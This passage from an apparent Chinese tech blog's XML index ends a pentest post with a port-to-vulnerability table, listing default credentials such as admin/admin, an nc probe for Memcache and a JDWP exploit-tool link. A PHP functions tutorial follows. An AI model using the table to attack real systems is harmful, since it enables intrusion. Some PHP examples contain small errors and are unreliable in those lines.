<td>8000</td>
<td>jdwp</td>
<td>JDWP 远程命令执行漏洞（<a href="https://github.com/IOActive/jdwp-shellifier">工具</a>）</td>
</tr>
<tr>
<td>8080/8089</td>
<td>Tomcat/JBoss/Resin/Jetty/Jenkins</td>
<td>反序列化、控制台弱口令、未授权</td>
</tr>
<tr>
<td>8161</td>
<td>ActiveMQ</td>
<td>admin/admin、任意文件写入、反序列化</td>
</tr>
<tr>
<td>8069</td>
<td>Zabbix</td>
<td>远程命令执行</td>
</tr>
<tr>
<td>9043</td>
<td>WebSphere控制台</td>
<td>控制台弱口令https://:9043/ibm/console/logon.jsp、远程代码执行</td>
</tr>
<tr>
<td>9200/9300</td>
<td>Elasticsearch服务</td>
<td>远程代码执行</td>
</tr>
<tr>
<td>11211</td>
<td>Memcache</td>
<td>未授权访问（nc -vv 11211）</td>
</tr>
<tr>
<td>27017</td>
<td>MongoDB</td>
<td>未授权访问、爆破弱口令</td>
</tr>
<tr>
<td>50000</td>
<td>SAP</td>
<td>远程代码执行</td>
</tr>
<tr>
<td>50070</td>
<td>hadoop</td>
<td>未授权访问</td>
</tr>
</tbody></table>
<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>信息收集是一个看似琐碎但不可或缺的步骤，在网络攻击和防御的成本都越来越低的当下，信息差往往是决定成败的关键。只有找到更多的资产暴露攻击面，才能找到别人发现不了的漏洞。</p>
]]></content>
      <categories>
        <category>Web渗透</category>
      </categories>
      <tags>
        <tag>信息搜集</tag>
      </tags>
  </entry>
  <entry>
    <title>函数的用法及封装、变量范围</title>
    <url>/posts/e7ac7642.html</url>
    <content><![CDATA[<h2 id="函数的定义"><a href="#函数的定义" class="headerlink" title="函数的定义"></a>函数的定义</h2><p>函数<code>function</code>是一段完成指定任务的已命名代码块。函数可以遵照给它的一组值或参数完成特定的任务，并且可能返回一个值。在<code>PHP</code>中有两种函数：<strong>自定义函数与系统函数</strong>。</p>
<p>函数的优点：</p>
<ul>
<li><strong>控制程序设计的复杂性</strong></li>
<li><strong>提高软件的可靠性</strong></li>
<li><strong>提高软件的开发效率</strong></li>
<li><strong>提高软件的可维护性</strong></li>
<li><strong>提高程序的重用性</strong></li>
</ul>
<h2 id="自定义函数"><a href="#自定义函数" class="headerlink" title="自定义函数"></a>自定义函数</h2><h3 id="自定义函数语法格式："><a href="#自定义函数语法格式：" class="headerlink" title="自定义函数语法格式："></a>自定义函数语法格式：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function  函数名称([参数1 [,参数2 [,…]]])&#123;</span><br><span class="line">	程序内容叙述(也叫函数体);</span><br><span class="line">	[return 返回值;] &#x2F;&#x2F;如需函数有返回值时使用</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<h3 id="函数的使用："><a href="#函数的使用：" class="headerlink" title="函数的使用："></a>函数的使用：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">函数名称([参数1 [,参数2 [,…]]]);</span><br></pre></td></tr></table></figure>
<h3 id="自定义函数的名称："><a href="#自定义函数的名称：" class="headerlink" title="自定义函数的名称："></a>自定义函数的名称：</h3><p>它是函数在程序代码中的识别名称，函数名可以是以字母或下划线开头后跟零个或多个字母、下划线和数字的任何字符串。函数名不区分大小写。命名函数时不可使用已声明的函数，或PHP内建的函数名称。</p>
<h3 id="参数："><a href="#参数：" class="headerlink" title="参数："></a>参数：</h3><p>所谓的参数就是用来把数值由函数外部传入函数体中，并用来加以运算处理。参数之间用“ ，”号隔开。当函数不需要任何数值传入时，可以省略参数。</p>
<h3 id="返回值："><a href="#返回值：" class="headerlink" title="返回值："></a>返回值：</h3><p>当调用函数时需要它返回一些数值，那么就要函数体中用<code>return</code>语句实现。格式如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">return  返回值；    &#x2F;&#x2F;返回值也可以是一个表达式</span><br><span class="line">exit();   	       &#x2F;&#x2F;无返回值 void</span><br></pre></td></tr></table></figure>
<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    echo &quot;用函数求累加：&lt;br&gt;&quot;;</span><br><span class="line">    function test($a)</span><br><span class="line">    &#123;   </span><br><span class="line">        $sum&#x3D;0;</span><br><span class="line">        for($i&#x3D;0;$i&lt;&#x3D;$a;$i++)</span><br><span class="line">            $sum+&#x3D;$i;</span><br><span class="line">        return $sum;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &quot;50的累加是：&quot;.test(50).&quot;&lt;br&gt;&quot;;</span><br><span class="line">    echo &quot;100的累加是：&quot;.test(100).&quot;&lt;br&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h2 id="判断函数是否存在"><a href="#判断函数是否存在" class="headerlink" title="判断函数是否存在"></a>判断函数是否存在</h2><p><code>function_exists()</code> - - 判断函数是否存在。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var_dump(function_exists(&#39;mkdir&#39;));</span><br><span class="line">&#x2F;&#x2F;判断系统函数mkdir是否存在，输出bool(true)</span><br></pre></td></tr></table></figure>

<h2 id="PHP变量的范围"><a href="#PHP变量的范围" class="headerlink" title="PHP变量的范围"></a>PHP变量的范围</h2><p>变量的范围意指变量在程序中的可作用范围。当一个变量执行赋值动作后，会随着声明局部的差异，而有不同的作用范围。大致上来说变量会依据声明的局部分为下列两种：<strong>局部变量和全局变量</strong></p>
<h3 id="局部变量-内部变量"><a href="#局部变量-内部变量" class="headerlink" title="局部变量(内部变量)"></a>局部变量(内部变量)</h3><p>在函数之中声明的变量就是局部变量，并且该变量只有在函数范围之中才能加以使用。如果其它程序局部需要调用使用该变量值时，必须通过<code>return</code>指令，来将其传回至主程序区块以作后续处理。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$a&#x3D;0;</span><br><span class="line">function print_A()&#123; </span><br><span class="line">    $a &#x3D; 3;	&#x2F;&#x2F;定义局部变量</span><br><span class="line">    echo &quot;在函数中显示局部变量 a 值: $a &lt;p&gt;&quot;;  &#x2F;&#x2F;输出a的值是3</span><br><span class="line">    return $a; </span><br><span class="line">&#125;</span><br><span class="line">$b &#x3D; print_A();</span><br><span class="line">echo &quot;在函数外显示局部变量 b 值: $b &lt;br&gt;&quot;;     &#x2F;&#x2F;输出a的值是3</span><br><span class="line">echo $a;       &#x2F;&#x2F;输出a的值是3</span><br></pre></td></tr></table></figure>

<h3 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h3><ul>
<li><strong>在函数范围之外所声明的变量就是全局变量</strong>。由于函数可以视为单独的程序片段，所以局部变量会复盖全局变量的能见度，因此<strong>在函数中并无法直接调用使用全局变量</strong>。</li>
<li>函数中若要使用全局变量时，必须要利用<code>global</code>关键字定义目标变量，以告诉函数主体此变量为全局。  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$a &#x3D; 5;</span><br><span class="line">function print_A()&#123; </span><br><span class="line">    global $a;</span><br><span class="line">    $a &#x3D; 10;</span><br><span class="line">    echo &quot;在函数中显示全局变量 a 值: $a &lt;p&gt;&quot;;  &#x2F;&#x2F;输出a的值是10</span><br><span class="line">    return $a; </span><br><span class="line">&#125;</span><br><span class="line">$b &#x3D; print_A();</span><br><span class="line">echo &quot;在函数外显示全局变量 b 值: $b &lt;br&gt;&quot;;     &#x2F;&#x2F;输出a的值是10</span><br><span class="line">echo $a;        &#x2F;&#x2F;输出a的值是10</span><br></pre></td></tr></table></figure></li>
<li>也可以使用预定义的全局变量数组<code>$GLOBALS</code>.这是一个特殊变量在程序运行时自动创建。格式：<code>echo $GLOBALS[&quot;变量名&quot;];</code>  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$a &#x3D; 5;</span><br><span class="line">echo $GLOBALS[&quot;a&quot;];     &#x2F;&#x2F;输出5</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><ul>
<li>在函数中声明全局变量时，其名字要与全局变量一致<br>通过<code>unset($var)</code>可以手动删除变量，变量会在内存中被释放，也就不在全局作用域中了。</li>
<li>使用<code>require</code>与<code>include</code>包含不会影响作用域</li>
<li>通过参数列表传递给函数的变量，对于函数来说是局部变量，除非在传递时带有<code>&amp;</code>引用符号</li>
</ul>
<h3 id="静态变量"><a href="#静态变量" class="headerlink" title="静态变量"></a>静态变量</h3><p><code>PHP</code>支持声明函数变量为静态的<code>static</code>。一个静态变量在所有对该函数的调用之间共享，并且仅在脚本的执行期间函数第一次被调用时被初始化。要声明函数变量为静态的用关键字<code>static</code>。通常，静态变量的第一次使用时赋予一个初始值。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function test() &#123;</span><br><span class="line">	static $a &#x3D; 0;    &#x2F;&#x2F;声明静态变量a的初始值为0</span><br><span class="line">	echo $a;          &#x2F;&#x2F;输出a的值</span><br><span class="line">	$a++;             &#x2F;&#x2F;每次调用函数后a的值+1</span><br><span class="line">&#125;</span><br><span class="line">test();        &#x2F;&#x2F;调用第一次输出a的值为0</span><br><span class="line">test();        &#x2F;&#x2F;调用第二次输出a的值为1</span><br><span class="line">test();        &#x2F;&#x2F;调用第三次输出a的值为2</span><br><span class="line">test();        &#x2F;&#x2F;调用第四次输出a的值为3</span><br><span class="line">test();        &#x2F;&#x2F;调用第五次输出a的值为4</span><br></pre></td></tr></table></figure>

<h2 id="声明及应用各种形式的PHP函数"><a href="#声明及应用各种形式的PHP函数" class="headerlink" title="声明及应用各种形式的PHP函数"></a>声明及应用各种形式的PHP函数</h2><h3 id="常规参数的函数"><a href="#常规参数的函数" class="headerlink" title="常规参数的函数"></a>常规参数的函数</h3><ul>
<li>函数的<strong>实参和形参应该个数相等、类型一致</strong>。</li>
<li>调用时传递的参数<strong>个数和顺序必须一致</strong>。</li>
</ul>
<h4 id="chr"><a href="#chr" class="headerlink" title="chr()"></a>chr()</h4><p>传递进去<code>ascii</code>码,返回对应的<code>ascii</code>值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var_dump(chr(65));      &#x2F;&#x2F;输出string(1) &quot;A&quot;</span><br></pre></td></tr></table></figure>
<h4 id="ceil"><a href="#ceil" class="headerlink" title="ceil()"></a>ceil()</h4><p>进一法取整，返回<code>float</code>类型整数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var_dump(ceil(5.44411111)); &#x2F;&#x2F;输出float(6)</span><br></pre></td></tr></table></figure>
<h4 id="array-combine"><a href="#array-combine" class="headerlink" title="array_combine()"></a>array_combine()</h4><p>合并一个数组,第一个传参<code>key</code>值，第二个传参<code>value</code>值，返回一个数组</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$info &#x3D; array(&#39;1&#39;,&#39;2&#39;,&#39;3&#39;);</span><br><span class="line">$info2 &#x3D; array(&#39;a&#39;,&#39;b&#39;,&#39;c&#39;);</span><br><span class="line">var_dump(array_combine($info,$info2));  </span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020102108.png" alt="image"></p>
<h4 id="implode"><a href="#implode" class="headerlink" title="implode()"></a>implode()</h4><p>合并数组并且用符号隔开返回<code>string</code>类型</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var_dump(implode(&quot;,&quot;,[&#39;key&#39;,&#39;key1&#39;,&#39;key2&#39;]));   &#x2F;&#x2F;输出string(13) &quot;key,key1,key2&quot;</span><br></pre></td></tr></table></figure>
<h3 id="引用参数的函数"><a href="#引用参数的函数" class="headerlink" title="引用参数的函数"></a>引用参数的函数</h3><ul>
<li>相对于按值传递模式，并不会将父程序中的指定数值或目标变量传递给函数，而是把该数值或变量的内存储存区块相对地址导入函数之中。因此当该<strong>数值在函数中有任何变动时，会连带对父程序造成影响</strong>。</li>
<li>如果在函数的形参中使用<code>&amp;</code>修饰的参数，在调用该函数时必须传入一个变量给这个参数，而是不能传递一个值。</li>
</ul>
<h4 id="使用常规参数传值，类似于局部变量"><a href="#使用常规参数传值，类似于局部变量" class="headerlink" title="使用常规参数传值，类似于局部变量"></a>使用常规参数传值，类似于局部变量</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function test($arg) &#123;         </span><br><span class="line">    $arg &#x3D; 200;  &#x2F;&#x2F;在函数中改变参数$a的值为200</span><br><span class="line">&#125;</span><br><span class="line">$var &#x3D; 100;      &#x2F;&#x2F;在父程序中声明一个全局变量$var，初值为100</span><br><span class="line">test($var);      &#x2F;&#x2F;调用test函数，并将变量$var的值100传给函数的参数$arg</span><br><span class="line">echo $var;       &#x2F;&#x2F;输出100。$var的值没有变化</span><br></pre></td></tr></table></figure>
<h4 id="使用“-amp-”引用参数传值，类似于全局变量"><a href="#使用“-amp-”引用参数传值，类似于全局变量" class="headerlink" title="使用“&amp;”引用参数传值，类似于全局变量"></a>使用“&amp;”引用参数传值，类似于全局变量</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function test( &amp;$arg ) &#123;        </span><br><span class="line">    $arg &#x3D; 200;   &#x2F;&#x2F;改变参数$a的值为200,$arg是引用参数，外部变量$var也被修改</span><br><span class="line">&#125;</span><br><span class="line">$var &#x3D; 100;       &#x2F;&#x2F;在父程序中声明一个全局变量$var，初值为100</span><br><span class="line">test($var);         &#x2F;&#x2F;调用test函数，并将变量$var的引用传给函数的参数$arg</span><br><span class="line">echo $var;        &#x2F;&#x2F;输出200。$var的值在函数中修改变量$arg时被修改</span><br></pre></td></tr></table></figure>
<h3 id="默认参数的函数"><a href="#默认参数的函数" class="headerlink" title="默认参数的函数"></a>默认参数的函数</h3><ul>
<li>在<code>php</code>中，支持函数的默认方式调用。<strong>如果在调用函数时没有指定参数的值，在函数中会使用参数的默认值</strong>。 </li>
<li>默认参数必须列在所有没有默认值参数的后面。</li>
</ul>
<h4 id="有默认参数的函数"><a href="#有默认参数的函数" class="headerlink" title="有默认参数的函数"></a>有默认参数的函数</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function test($name &#x3D; &#39;张三&#39;, $sex &#x3D; &quot;男&quot;, $age &#x3D; &quot;18&quot;)</span><br><span class="line">&#123;</span><br><span class="line">	echo &quot;我的名字叫：&quot;.$name.&quot; 性别：&quot;.$sex. &quot; 年龄：&quot;.$age.&quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">test();    &#x2F;&#x2F;输出我的名字叫：张三 性别：男 年龄：18</span><br><span class="line">test(&quot;李四&quot;);    &#x2F;&#x2F;输出我的名字叫：李四 性别：男 年龄：18</span><br><span class="line">test(&quot;王麻子&quot;,&quot;女&quot;);&#x2F;&#x2F;输出我的名字叫：王麻子 性别：女 年龄：18</span><br><span class="line">test(&quot;王麻子2&quot;,&quot;女&quot;,&quot;16&quot;); &#x2F;&#x2F;我的名字叫：王麻子2 性别：女 年龄：16</span><br></pre></td></tr></table></figure>

<h4 id="没有默认参数的函数"><a href="#没有默认参数的函数" class="headerlink" title="没有默认参数的函数"></a>没有默认参数的函数</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function test($name, $sex, $age)</span><br><span class="line">&#123;</span><br><span class="line">	echo &quot;我的名字叫：&quot;.$name.&quot; 性别：&quot;.$sex. &quot; 年龄：&quot;.$age.&quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">test();     &#x2F;&#x2F;报错必须指定三个参数值</span><br><span class="line">test(&quot;王麻子2&quot;,&quot;女&quot;,&quot;16&quot;); &#x2F;&#x2F;输出我的名字叫：王麻子2 性别：女 年龄：16</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020102109.png" alt="image"></p>
<h3 id="可变个数参数的函数"><a href="#可变个数参数的函数" class="headerlink" title="可变个数参数的函数"></a>可变个数参数的函数</h3><p>通常用户定义函数时，设置的参数数量是有限的。如果希望函数可以接受任意数量的参数，需使用以下函数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">func_get_args()  &#x2F;&#x2F;返回一个数组，包含所有参数</span><br><span class="line">func_num_args()  &#x2F;&#x2F;返回参数总数 </span><br><span class="line">func_get_arg()    &#x2F;&#x2F;接收一个数组下标，返回指定数组下标的值</span><br></pre></td></tr></table></figure>
<h4 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h4><p>声明一个函数<code>more_args()</code>，用于打印参数列表的值<br>虽然没有声明参数列表，但可以传入任意个数，任意类型的参数值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function more_args() &#123;           </span><br><span class="line">    $args &#x3D; func_get_args();          &#x2F;&#x2F;将所有传递给脚本函数的参数当做一个数组返回</span><br><span class="line">    for($i&#x3D;0; $i&lt;count($args); $i++) &#123;               &#x2F;&#x2F;使用for循环遍历数组$args</span><br><span class="line">        echo &quot;第&quot;.$i.&quot;个参数是&quot;.$args[$i].&quot;&lt;br&gt;&quot;;    &#x2F;&#x2F;分别输出传入函数的每个参数</span><br><span class="line">    &#125;</span><br><span class="line">    var_dump(func_get_arg(3));  &#x2F;&#x2F;输出一次$args数组中下标为3的参数</span><br><span class="line">&#125;</span><br><span class="line">more_args(&quot;one&quot;, &quot;two&quot;, &quot;three&quot;, 1, 2, 3, 4);           &#x2F;&#x2F;调用函数并输入多个参数</span><br></pre></td></tr></table></figure>
<p>页面返回结果：</p>
<p><img src="https://qiniu.hzktester.top/tp2020102110.png" alt="image"></p>
<h4 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h4><p>直接使用<code>func_num_args()</code>函数得到数组的总数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function more_args() &#123;           </span><br><span class="line">    for($i&#x3D;0; $i&lt;func_num_args(); $i++) &#123;            &#x2F;&#x2F;使用for循环遍历数组$args</span><br><span class="line">        echo &quot;第&quot;.$i.&quot;个参数是&quot;.func_get_arg($i).&quot;&lt;br&gt;&quot;;&#x2F;&#x2F;分别输出传入函数的每个参数</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">more_args(&quot;one&quot;, &quot;two&quot;, &quot;three&quot;, 1, 2, 3);           &#x2F;&#x2F;调用函数并输入多个参数</span><br></pre></td></tr></table></figure>
<p>返回结果和示例1一致</p>
<h3 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h3><p>所谓回调函数，就是指调用函数时并不是传递一个标准的变量作为参数，而是<strong>将另一函数作为参数传递到调用的函数中</strong>。</p>
<h4 id="变量回调函数"><a href="#变量回调函数" class="headerlink" title="变量回调函数"></a>变量回调函数</h4><h5 id="示例1"><a href="#示例1" class="headerlink" title="示例1"></a>示例1</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;** 声明第一个函数one, 计算两个数的和</span><br><span class="line">    @param  int $a  计算和的第一个运算元</span><br><span class="line">    @param  int $b  计算和的第二个运算元</span><br><span class="line">    @return int     返回计算后的结果</span><br><span class="line">*&#x2F;</span><br><span class="line">function one( $a, $b ) &#123;</span><br><span class="line">    return $a + $b;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;** 声明第二个函数two, 计算两个数的平方和</span><br><span class="line">*&#x2F;</span><br><span class="line">function two($a, $b) &#123;</span><br><span class="line">    return $a*$b + $b*$b;</span><br><span class="line">&#125;   </span><br><span class="line">$result &#x3D; &quot;one&quot;;   &#x2F;&#x2F;将函数名&quot;one&quot;赋给变量$result, 执行$result()时则调用函数one()</span><br><span class="line">&#x2F;&#x2F; $result &#x3D; &quot;two&quot;; &#x2F;&#x2F;将函数名&quot;two&quot;赋给变量$result, 执行$result()时则调用函数two()</span><br><span class="line">echo &quot;运算结果是：&quot;.$result(2, 3);    &#x2F;&#x2F;变量$result的函数名值是哪个，就调用哪个函数</span><br></pre></td></tr></table></figure>
<h5 id="示例2"><a href="#示例2" class="headerlink" title="示例2"></a>示例2</h5><p>声明回调函数<code>filter</code>, 在<code>0-100</code>的整数中通过自定义条件过滤不要的数字</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function filter( $fun ) &#123;</span><br><span class="line">    for($i&#x3D;0; $i &lt;&#x3D; 100; $i++) &#123;</span><br><span class="line">        &#x2F;&#x2F;将参数变量$fun加上一个圆插号$fun(), 则为调用和变量$fun值同名的函数</span><br><span class="line">        if( $fun($i) ) </span><br><span class="line">             continue;   </span><br><span class="line">        echo $i.&#39;&lt;br&gt;&#39;; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;声明一个函数one, 如果参数是3的倍数就返回true, 否则返回false</span><br><span class="line">function one($num) &#123;</span><br><span class="line">    return $num%3 !&#x3D; 0;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; 声明一个函数two, 如果参数是一个回文数(翻转后还等于自己的数)返回true, 否则返回false</span><br><span class="line">function two($num) &#123;</span><br><span class="line">    return $num%7 !&#x3D; 0;</span><br><span class="line">&#125;</span><br><span class="line">filter(&quot;one&quot;);      &#x2F;&#x2F;打印出100以内3的倍数，参数&quot;one&quot;是函数one()的名称字符串，是一个回调</span><br><span class="line">echo &#39;--------------------&lt;br&gt;&#39;;</span><br><span class="line">filter(&#39;two&#39;);      &#x2F;&#x2F;打印出100以内7的倍数，参数&quot;two&quot;是函数two()的名称字符串，是一个回调</span><br></pre></td></tr></table></figure>
<p>页面返回结果：</p>
<p><img src="https://qiniu.hzktester.top/tp2020102111.png" alt="image"></p>
<h4 id="类静态函数和对象的方法回调"><a href="#类静态函数和对象的方法回调" class="headerlink" title="类静态函数和对象的方法回调"></a>类静态函数和对象的方法回调</h4><p>借助<code>call_user_func_array()</code>函数自定义回调函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;* 声明一个类Demo,类中声明一个静态的成员方法fun() *&#x2F;</span><br><span class="line">class Demo &#123;</span><br><span class="line">    static function fun($msg1, $msg2) &#123;</span><br><span class="line">        echo &#39;$msg1 &#x3D; &#39;.$msg1;</span><br><span class="line">        echo &#39;&lt;br&gt;&#39;;</span><br><span class="line">        echo &#39;$msg2 &#x3D; &#39;.$msg2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;* 声明一个类Test, 类中声明一个普通的成员方法fun()  *&#x2F;</span><br><span class="line">class Test &#123;</span><br><span class="line">    function fun($msg1, $msg2) &#123;</span><br><span class="line">        echo &#39;$msg1 &#x3D; &#39;.$msg1;</span><br><span class="line">        echo &#39;&lt;br&gt;&#39;;</span><br><span class="line">        echo &#39;$msg2 &#x3D; &#39;.$msg2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">call_user_func_array( array(&quot;Demo&quot;, &#39;fun&#39;), array(&#39;LAMP&#39;, &#39;兄弟连&#39;) );</span><br><span class="line">echo &#39;&lt;br&gt;&#39;;</span><br><span class="line">echo &#39;&lt;br&gt;&#39;;</span><br><span class="line">call_user_func_array( array(new Test(), &#39;fun&#39;), array(&#39;BroPHP&#39;, &#39;学习型PHP框架&#39;) );</span><br></pre></td></tr></table></figure>
<p>页面返回结果：</p>
<p><img src="https://qiniu.hzktester.top/tp2020102112.png" alt="image"></p>
<h3 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h3><p>匿名函数<code>Anonymous functions</code>，也叫闭包函数<code>closures</code>，允许 临时创建一个没有指定名称的函数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$greet &#x3D; function($name)&#123;</span><br><span class="line">	echo (&quot;Hello %s\r\n&quot;, $name);</span><br><span class="line">&#125;</span><br><span class="line">$greet(&#39;World&#39;);    &#x2F;&#x2F;输出 Hello World</span><br><span class="line">$greet(&#39;PHP&#39;);      &#x2F;&#x2F;输出 Hello PHP</span><br></pre></td></tr></table></figure>
<h3 id="递归函数"><a href="#递归函数" class="headerlink" title="递归函数"></a>递归函数</h3><ul>
<li>所谓的函数递归调用，就是函数<strong>可以在其声明的执行叙述之中调用执行自己</strong>。</li>
<li>通常在此类型的函数之中会<strong>附加一个条件判断叙述</strong>，以判断是否需要执行递归调用，并且<strong>在特定条件下终止函数的递归调用动作</strong>，把目前流程的主控权交回上一层函数执行。因此当某个执行递归调用的函数，<strong>没有附加条件判断叙述时可能会造成无限循环的错误情形</strong>.</li>
<li>函数递归调用最大的好处在于<strong>可以精简程序中繁杂重复调用程序</strong>，并且能以这种特性来<strong>执行一些较为复杂的运算动作</strong>。<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line">    声明一个名称为test的函数，用于测试递归</span><br><span class="line">    $param  int $n  需要一个整数作为参数</span><br><span class="line">*&#x2F;</span><br><span class="line">function test( $n ) &#123;             &#x2F;&#x2F;声明一个名为test的函数，有一个参数</span><br><span class="line">    echo $n.&quot;&amp;nbsp;&amp;nbsp;&quot;; &#x2F;&#x2F;在函数开始处输出参数的值和两个空格</span><br><span class="line">    </span><br><span class="line">    if($n&gt;0)                            &#x2F;&#x2F;判断参数是否大于0</span><br><span class="line">        test($n-1);                    &#x2F;&#x2F;如果参数大于0则调用自己，并将参数减1后再传入</span><br><span class="line">    else                                  &#x2F;&#x2F;判断参数不大于0</span><br><span class="line">        echo &quot; &lt;--&gt; &quot;;                &#x2F;&#x2F;输出分界字符串</span><br><span class="line">        </span><br><span class="line">    echo $n.&quot;&amp;nbsp;&amp;nbsp;&quot;; &#x2F;&#x2F;在函数结束处输出参数的值和两个空格</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">test(10);</span><br></pre></td></tr></table></figure>
页面返回结果：</li>
</ul>
<p><img src="https://qiniu.hzktester.top/tp2020102113.png" alt="image"></p>
<h3 id="调用自定义函数库"><a href="#调用自定义函数库" class="headerlink" title="调用自定义函数库"></a>调用自定义函数库</h3><p>通过重复使用已有的代码，提高开发效率，降低成本</p>
<h4 id="include-和require-函数"><a href="#include-和require-函数" class="headerlink" title="include()和require()函数"></a>include()和require()函数</h4><p><code>include()</code>与<code>require ()</code>几乎等价，区别在于在脚本执行时包含，当处理失败时，<code>include()</code>产生一个警告而<code>require()</code>则导致一个致命错误。</p>
<h5 id="使用include-引入不存在的文件"><a href="#使用include-引入不存在的文件" class="headerlink" title="使用include()引入不存在的文件"></a>使用include()引入不存在的文件</h5><p>如果文件引用失败，那么就报警告错误还是会执行后面的代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">include &quot;tests.php&quot;;</span><br><span class="line">echo &quot;1&quot;;</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020102114.png" alt="image"></p>
<h5 id="使用require-引入不存在的文件"><a href="#使用require-引入不存在的文件" class="headerlink" title="使用require()引入不存在的文件"></a>使用require()引入不存在的文件</h5><p>如果文件引用失败,那么就直接终止程序，不会执行后面的代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">require &quot;tests.php&quot;;</span><br><span class="line">echo &quot;1&quot;;</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020102115.png" alt="image"></p>
<h4 id="include-once-和require-once-函数"><a href="#include-once-和require-once-函数" class="headerlink" title="include_once()和require_once()函数"></a>include_once()和require_once()函数</h4><p>两个函数在脚本执行期间包括并运行指定文件。与<code>include()</code>语句及<code>require()</code>类似，唯一区别是<strong>如果该文件中的代码已经被包括了，则不会再次包括，只会包括一次</strong>。这两个函数应该用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。</p>
<p>同目录下有一个<code>test.php</code>文件，内容如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	echo &quot;test &lt;br&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h5 id="示例1：-1"><a href="#示例1：-1" class="headerlink" title="示例1："></a>示例1：</h5><p>使用<code>include()</code>函数调用<code>test.php</code>文件多次。输出4次<code>test</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">include &quot;test.php&quot;;</span><br><span class="line">include &quot;test.php&quot;;</span><br><span class="line">include &quot;test.php&quot;;</span><br><span class="line">include &quot;test.php&quot;;</span><br></pre></td></tr></table></figure>
<h5 id="示例2：-1"><a href="#示例2：-1" class="headerlink" title="示例2："></a>示例2：</h5><p>使用<code>include_once()</code>函数和<code>require_once()</code>调用<code>test.php</code>文件多次。只输出一次<code>test</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">include_once &quot;test.php&quot;;</span><br><span class="line">include_once &quot;test.php&quot;;</span><br><span class="line">include_once &quot;test.php&quot;;</span><br><span class="line">include_once &quot;test.php&quot;;</span><br><span class="line">require_once &quot;test.php&quot;;</span><br><span class="line">require_once &quot;test.php&quot;;</span><br><span class="line">require_once &quot;test.php&quot;;</span><br><span class="line">require_once &quot;test.php&quot;;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>PHP基础</category>
      </categories>
      <tags>
        <tag>PHP基础</tag>
      </tags>
  </entry>
  <entry>
    <title>流程控制语句、分支、循环</title>
    <url>/posts/208f6916.html</url>
    <content><![CDATA[<h2 id="流程控制概述"><a href="#流程控制概述" class="headerlink" title="流程控制概述"></a>流程控制概述</h2><ul>
<li>任何 <code>PHP</code> 脚本都是由一系列语句构成的。一条语句可以是一个赋值语句，一个函数调用，一个循环，甚至一个什么也不做的（空语句）条件语句。语句通常以分号结束。此外，还可以用花括号将一组语句封装成一个语句组。语句组本身可以当作是一行语句。</li>
